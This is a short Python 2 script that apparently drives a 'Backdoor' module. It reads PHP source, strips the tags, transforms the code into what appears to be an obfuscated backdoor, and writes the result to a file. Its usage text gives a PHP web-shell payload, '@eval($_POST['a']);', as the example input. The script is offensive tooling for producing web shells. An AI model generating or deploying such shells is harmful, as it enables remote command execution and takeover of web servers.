from backdoor import *
import re
import sys
def load_file(filename):
   files=open(filename,'r')
   str1=files.read()
   str1=re.sub('^<\?php','',str1)
   str1=re.sub('\?>$', '', str1)
  # str1=str1.replace('<?php','').replace('?>','')
   return str1
usage='''usage:python test.py str  outfile
Example:python test.py @eval($_POST['a']);  aa.phip 
'''

if __name__ == "__main__":


    if  len(sys.argv) != 3:
        print usage
    else:
        print sys.argv
        s=load_file(sys.argv[1])
        test=Backdoor(s)
        files=open(sys.argv[2],'w')
        files.write(test.__str__())
        files.close()
